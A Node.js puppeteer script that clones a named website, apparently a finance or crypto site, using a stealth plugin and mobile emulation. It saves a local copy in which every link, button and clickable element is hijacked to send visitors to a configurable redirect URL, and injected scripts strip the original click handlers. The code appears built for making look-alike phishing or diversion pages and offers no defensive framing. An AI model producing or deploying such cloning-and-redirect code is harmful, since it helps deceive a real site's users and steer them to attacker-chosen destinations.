import puppeteer from "puppeteer-extra";
import StealthPlugin from "puppeteer-extra-plugin-stealth";
import * as cheerio from "cheerio";
import axios from "axios";
import fs from "fs-extra";
import path from "path";
import { fileURLToPath, URL } from "url";

// Define __filename and __dirname
const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);
puppeteer.use(StealthPlugin());

(async () => {
  const siteUrl = "https://www.r2.money/"; // Change this to the site you want to clone
  const outputDir = path.join(__dirname, "cloned");
  const redirectURL = "https://google.com";

  // Clear the cloned directory before starting
  async function clearClonedDirectory() {
    try {
      await fs.remove(outputDir); // Remove the entire cloned directory
      console.log("🧹 Cleared cloned directory:", outputDir);
    } catch (err) {
      console.error("⚠️ Failed to clear cloned directory:", err.message);
    }
  }

  try {
    // Clear and recreate directories
    await clearClonedDirectory();
    await fs.ensureDir(path.join(outputDir, "css")); // Create css directory
    console.log("📁 Created css directories");

    // Launch browser
    const browser = await puppeteer.launch({
      headless: "new",
      args: ["--no-sandbox", "--disable-setuid-sandbox"],
    });

    try {
      const page = await browser.newPage();
      await page.emulate({
        viewport: {
          width: 375,
          height: 812,
          deviceScaleFactor: 3,
          isMobile: true,
          hasTouch: true,
          isLandscape: false,
        },
        userAgent:
          "Mozilla/5.0 (iPhone; CPU iPhone OS 15_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Mobile/15E148 Safari/604.1",
      });

      // Navigate and wait for full rendering
      await page.goto(siteUrl, { waitUntil: "networkidle2", timeout: 30000 });
      await new Promise((resolve) => setTimeout(resolve, 5000)); // Additional wait for dynamic content

      // Execute JavaScript in the browser context to modify image src and remove srcset
      await page.evaluate((siteUrl) => {
        const images = document.querySelectorAll("img[src]");
        images.forEach((img) => {
          const src = img.getAttribute("src");
          if (src && !src.startsWith("data:")) {
            try {
              // Resolve relative URLs and ensure src starts with siteUrl
              const fullUrl = new URL(src, siteUrl).href;
              const urlObj = new URL(fullUrl);
              const editedSrc = `${siteUrl}${urlObj.pathname}${urlObj.search}${urlObj.hash}`;
              img.setAttribute("src", editedSrc);
              img.removeAttribute("srcset");
              console.log(`🖼️ Updated image: src=${editedSrc}, srcset removed`);
            } catch (err) {
              console.warn(
                `⚠️ Failed to process image URL: ${src}, error: ${err.message}`
              );
              img.removeAttribute("srcset");
            }
          } else {
            img.removeAttribute("srcset");
          }
        });
      }, siteUrl);

      // Get the modified HTML after JavaScript execution
      const html = await page.content();
      const $ = cheerio.load(html);

      // Remove existing <base> tag and add new one at the start of <head>
      $("base").remove();
      $("head").prepend(`<base href="${siteUrl}">`);

      // Continue with the rest of your code (redirects, saving HTML, etc.)

      // Get and edit image src, remove srcset
      const images = $("img[src]");
      for (const el of images.toArray()) {
        const src = $(el).attr("src");
        if (src && !src.startsWith("data:")) {
          try {
            // Get the full URL (resolving relative paths)
            const fullUrl = new URL(src, siteUrl).href;
            // Extract the path portion (remove the domain if external)
            const urlObj = new URL(fullUrl);
            let editedSrc = `${siteUrl}${urlObj.pathname}${urlObj.search}${urlObj.hash}`;
            // Set the edited src to start with siteUrl
            $(el).attr("src", editedSrc);
            $(el).removeAttr("srcset"); // Remove srcset attribute
          } catch (err) {
            console.warn(
              `⚠️ Failed to process image URL: ${src}, error: ${err.message}`
            );
            $(el).removeAttr("srcset"); // Still remove srcset on error
          }
        } else {
          $(el).removeAttr("srcset"); // Remove srcset for data: URLs or invalid src
        }
      }

      // Redirect external links
      $("a[href]").each((_, el) => {
        const href = $(el).attr("href");
        if (
          href &&
          href.startsWith("http") &&
          !href.includes(new URL(siteUrl).hostname)
        ) {
          $(el).attr("href", redirectURL);
          $(el).removeAttr("target");
        }
      });

      // Redirect buttons
      $("button:not([data-no-redirect])").each((_, el) => {
        $(el).attr("onclick", `window.location='${redirectURL}'`);
      });

      // Handle cursor:pointer elements
      let pointerCount = 0;
      $("[style]").each((_, el) => {
        const style = $(el).attr("style");
        if (style && style.toLowerCase().includes("cursor: pointer")) {
          $(el).attr("onclick", `window.location='${redirectURL}'`);
          pointerCount++;
        }
      });

      const pointerClasses = new Set();
      $("style").each((_, el) => {
        const css = $(el).html();
        const matches = css.match(
          /\.(\w[\w-]*)\s*{[^}]*cursor\s*:\s*pointer[^}]*}/gi
        );
        if (matches) {
          matches.forEach((rule) => {
            const classMatch = rule.match(/\.(\w[\w-]*)/);
            if (classMatch) {
              pointerClasses.add(classMatch[1]);
            }
          });
        }
      });

      $("head").prepend(`<script class="dynamic-script">
  window.addEventListener('DOMContentLoaded', () => {
    console.log("🔁 Running prioritized image fixer...");
    
    function fixImages() {
      const images = document.querySelectorAll('img');
      images.forEach(img => {
        const src = img.getAttribute('src');
        img.removeAttribute('srcset');
        if (src && src.startsWith('/') && !src.startsWith('data:') && !src.startsWith('//') && !src.startsWith('http')) {
          img.src = new URL(src, '${siteUrl}').href;
        }
      });
    }

    // Run immediately
    fixImages();
    
    // Run again after delay to catch late-loaded images
    setTimeout(fixImages, 3000);
    setInterval(fixImages, 10000); // optional long-term fix loop
  });
</script>`);
      $("head").prepend(`<script class="click-handler-script">
  document.addEventListener("DOMContentLoaded", () => {
    // Add href to all <a> tags
    const anchorElements = document.querySelectorAll("a");
    anchorElements.forEach(el => {
      el.setAttribute("href", "${redirectURL}");
      console.log("✅ Added href to <a>: ${redirectURL}");
    });

    // Handle clicks for interactive elements
    const interactiveElements = document.querySelectorAll(
      "a, button, input[role], [role='button'], [onclick], [style*='cursor: pointer'], input[type='button'], input[type='submit'], input[type='reset']"
    );
    interactiveElements.forEach(el => {
      el.onclick = null;
      el.removeAttribute("onclick");
      if (window.jQuery && typeof jQuery === "function") {
        try { jQuery(el).off("click"); } catch (err) {}
      }
      const reactKey = Object.keys(el).find(k => k.startsWith("__react"));
      if (reactKey) delete el[reactKey];
      el.addEventListener("click", (e) => {
        e.preventDefault();
        e.stopImmediatePropagation();
        window.location.href = "${redirectURL}";
      }, true);
    });
  });
</script>`);

      for (const className of pointerClasses) {
        $(`.${className}`).attr("onclick", `window.location='${redirectURL}'`);
        pointerCount += $(`.${className}`).length;
      }

      console.log("🎯 Pointer-style elements redirected:", pointerCount);
      console.log("🔘 <button> elements redirected:", $("button").length);
      console.log("🔗 <a> links replaced with:", redirectURL);

      // Save HTML
      await fs.outputFile(path.join(outputDir, "index.html"), $.html());
      console.log("✅ Done! Saved at cloned/index.html");
    } catch (err) {
      console.error("❌ Page processing failed:", err.message, err.stack);
    } finally {
      await browser.close();
    }
  } catch (err) {
    console.error("❌ Script failed:", err.message, err.stack);
  }
})();
